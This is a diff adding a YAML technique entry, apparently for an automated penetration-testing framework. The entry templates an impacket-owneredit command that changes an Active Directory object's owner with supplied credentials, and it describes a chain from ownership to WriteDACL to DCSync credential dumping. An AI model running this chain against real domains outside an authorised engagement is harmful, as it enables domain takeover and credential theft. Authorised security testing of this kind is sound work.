@@ -1,0 +1,17 @@
+name: owneredit
+category: ad
+description: Change AD object owner
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-owneredit '{domain}/{username}:{password}' -target '{target_dn}' -new-owner '{username}' -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Changes owner of AD object. Owner has implicit WriteDACL. Chain: owneredit → dacledit → DCSync."
